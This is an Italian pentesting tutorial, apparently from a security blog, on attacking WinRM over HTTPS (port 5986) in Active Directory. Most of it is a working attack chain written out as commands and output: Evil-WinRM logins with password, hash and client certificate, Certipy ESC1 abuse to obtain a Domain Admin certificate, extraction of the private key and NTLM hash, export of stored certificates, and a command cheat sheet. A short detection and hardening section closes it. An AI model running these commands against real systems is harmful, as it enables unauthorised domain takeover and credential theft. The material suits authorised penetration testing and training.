---
title: 'Porta 5986 WinRM HTTPS: Certificati, ADCS e Evil-WinRM'
slug: porta-5986-winrm-https
description: 'Porta 5986 WinRM HTTPS nel pentest: certificati client, Evil-WinRM su TLS, abuso ADCS e accesso remoto via certificate-based authentication.'
image: /porta-5986-winrm-https.webp
draft: true
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - WinRM HTTPS
  - ADCS Abuse
  - Evil-WinRM
---

La port 5986 TCP è la versione TLS/HTTPS di [WinRM sulla porta 5985](https://hackita.it/articoli/porta-5985-winrm). Tutto ciò che funziona sulla 5985 — Evil-WinRM, CrackMapExec, Pass-the-Hash, PowerShell Remoting — funziona identicamente sulla 5986, con il traffico cifrato da TLS. La differenza operativa nel penetration testing riguarda l'**autenticazione basata su certificato**: WinRM HTTPS supporta client certificate authentication, e quando è configurata, non servono password o hash — basta un certificato valido. Questo apre un vettore di attacco specifico: l'abuso di Active Directory Certificate Services (ADCS) per ottenere un certificato che garantisce accesso WinRM come qualsiasi utente del dominio.

Per tutte le tecniche di exploitation, post-exploitation, lateral movement e privilege escalation, la guida di riferimento è la [porta 5985 WinRM](https://hackita.it/articoli/porta-5985-winrm). Questo articolo copre ciò che è specifico della 5986: TLS, certificati e ADCS abuse.

## Quando Trovi la 5986 Invece della 5985

```
PORT     STATE  SERVICE
5985/tcp closed http           ← HTTP disabilitato (hardened)
5986/tcp open   ssl/http       ← Solo HTTPS consentito
```

Questo è un segno di hardening: l'admin ha disabilitato WinRM HTTP e forzato HTTPS. Tutti i tool funzionano, serve solo specificare SSL.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5986 --script=ssl-cert 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0
| ssl-cert:
|   Subject: CN=DC-01.corp.local
|   Issuer: CN=Corp-CA, DC=corp, DC=local
|   Not valid after: 2027-01-15
```

**Intelligence:**

* **Subject CN**: hostname completo → `DC-01.corp.local`
* **Issuer**: CA interna → `Corp-CA` → conferma ADCS è attivo nel dominio
* **Validità**: certificato non scaduto

### Verifica con curl

```bash
curl -sk https://10.10.10.40:5986/wsman -I
```

```
HTTP/1.1 405 Method Not Allowed
```

WinRM HTTPS attivo. Il flag `-k` ignora la verifica del certificato server.

### CrackMapExec

```bash
crackmapexec winrm 10.10.10.40 -u administrator -p 'Corp2025!' --port 5986
```

Stessa sintassi della 5985, aggiungi `--port 5986`.

## 2. Evil-WinRM via HTTPS

### Con password

```bash
evil-winrm -i 10.10.10.40 -u administrator -p 'Corp2025!' -S
```

Il flag `-S` attiva SSL (porta 5986).

### Con hash (Pass-the-Hash)

```bash
evil-winrm -i 10.10.10.40 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4' -S
```

### Con certificato client

```bash
evil-winrm -i 10.10.10.40 -c cert.pem -k key.pem -S
```

Se hai un certificato valido per un utente del dominio, non servono password o hash. Il certificato autentica direttamente.

## 3. ADCS Abuse — Certificato per WinRM

Active Directory Certificate Services (ADCS) è il servizio PKI di Microsoft. Se mal configurato, puoi richiedere un certificato per **qualsiasi utente del dominio** e usarlo per autenticarti via WinRM.

### Enumerazione ADCS

```bash
# Certipy: tool per enumerare e abusare ADCS
certipy find -u user@corp.local -p 'password' -dc-ip 10.10.10.40 -text -stdout
```

```
Certificate Templates:
  [!] VULNERABLE: ESC1
    Template Name: UserAuth
    Enrollment Rights: Domain Users
    Client Authentication: True
    Enrollee Supplies Subject: True
```

`ESC1` (Enrollee Supplies Subject = True) → qualsiasi Domain User può richiedere un certificato specificando il Subject — incluso il nome di un Domain Admin.

### Richiedi certificato come Domain Admin

```bash
certipy req -u user@corp.local -p 'password' -dc-ip 10.10.10.40 \
  -ca Corp-CA -template UserAuth -upn administrator@corp.local
```

```
[*] Certificate created for 'administrator@corp.local'
[*] Saved as administrator.pfx
```

Hai un certificato PFX valido per `administrator@corp.local`.

### Estrai cert e chiave dal PFX

```bash
# Estrai certificato
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out cert.pem

# Estrai chiave privata
openssl pkcs12 -in administrator.pfx -nocerts -out key.pem -nodes
```

### Connettiti via Evil-WinRM con il certificato

```bash
evil-winrm -i DC-01.corp.local -c cert.pem -k key.pem -S
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
corp\administrator
```

**Domain Admin via certificato** — senza conoscere password o hash.

### Autenticazione con Certipy (ottieni hash NTLM)

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.40
```

```
[*] Got hash for 'administrator@corp.local': aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
```

L'hash NTLM dell'administrator → usalo con tutti gli altri tool ([SMB](https://hackita.it/articoli/smb), [RDP](https://hackita.it/articoli/porta-3389-rdp), [DCSync](https://hackita.it/articoli/dcsync)).

### Altre vulnerabilità ADCS (ESC1-ESC8)

| Vulnerabilità | Descrizione                                           |
| ------------- | ----------------------------------------------------- |
| **ESC1**      | Template con Enrollee Supplies Subject                |
| **ESC2**      | Template con Any Purpose EKU                          |
| **ESC3**      | Certificate Request Agent abuse                       |
| **ESC4**      | Template con permessi di scrittura per utenti normali |
| **ESC6**      | CA con EDITF\_ATTRIBUTESUBJECTALTNAME2                |
| **ESC7**      | CA con ManageCA permission per utenti normali         |
| **ESC8**      | NTLM relay a HTTP enrollment endpoint                 |

```bash
# Enumera tutte le vulnerabilità
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.40 -vulnerable
```

Leggi tutte le esc da 1 a 16 e come sfruttarla per privesc. [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16/?highlight=esc1)

## 4. Certificati Rubati dal Filesystem

Se hai accesso a una macchina (via [VNC](https://hackita.it/articoli/porta-5900-vnc), RDP, shell), cerca certificati salvati:

```powershell
# Certificati nel cert store di Windows
certutil -store My

# Esporta un certificato con chiave privata
certutil -exportPFX -p "password" My "CN=administrator" C:\Windows\Temp\admin.pfx
```

```bash
# Su Linux, cerca file certificato
find / -name "*.pfx" -o -name "*.p12" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

## 5. PowerShell Remoting Nativo (da Windows)

```powershell
# Da una macchina Windows nel dominio
$sess = New-PSSession -ComputerName DC-01 -UseSSL -Credential (Get-Credential)
Invoke-Command -Session $sess -ScriptBlock { whoami; hostname; ipconfig }
Enter-PSSession $sess
```

```powershell
# Con certificato
$thumb = "ABC123DEF456..."  # thumbprint del certificato
$sess = New-PSSession -ComputerName DC-01 -UseSSL -CertificateThumbprint $thumb
```

## 6. Detection & Hardening

* **Solo HTTPS** — disabilita la porta 5985, forza 5986: `winrm set winrm/config/service @{AllowUnencrypted="false"}`
* **Certificate pinning** — accetta solo certificati firmati dalla CA interna
* **ADCS hardening** — mai `Enrollee Supplies Subject` su template con Client Auth
* **Revoca certificati** compromessi immediatamente
* **Audit template ADCS** regolarmente con Certipy o PSPKIAudit
* **Monitora** Event ID 4886/4887 (certificati richiesti/emessi) in ADCS
* **Tutti gli hardening della porta 5985** si applicano anche qui: JEA, Credential Guard, LAPS, PowerShell logging

## 7. Cheat Sheet Finale

| Azione          | Comando                                                              |
| --------------- | -------------------------------------------------------------------- |
| Nmap            | `nmap -sV -p 5986 --script=ssl-cert target`                          |
| CME HTTPS       | `crackmapexec winrm target -u user -p pass --port 5986`              |
| Evil-WinRM SSL  | `evil-winrm -i target -u user -p pass -S`                            |
| Evil-WinRM PtH  | `evil-winrm -i target -u user -H hash -S`                            |
| Evil-WinRM cert | `evil-winrm -i target -c cert.pem -k key.pem -S`                     |
| ADCS enum       | `certipy find -u user -p pass -dc-ip DC -vulnerable`                 |
| Request cert    | `certipy req -u user -p pass -ca CA -template TPL -upn admin@domain` |
| Auth con PFX    | `certipy auth -pfx admin.pfx -dc-ip DC`                              |
| Extract cert    | `openssl pkcs12 -in file.pfx -clcerts -nokeys -out cert.pem`         |
| Extract key     | `openssl pkcs12 -in file.pfx -nocerts -out key.pem -nodes`           |
| PS Remoting     | `New-PSSession -ComputerName target -UseSSL`                         |

***

Riferimento: Microsoft WinRM/ADCS documentation, Certipy, SpecterOps ADCS whitepaper, HackTricks. Uso esclusivo in ambienti autorizzati.
[https://hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html](https://hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
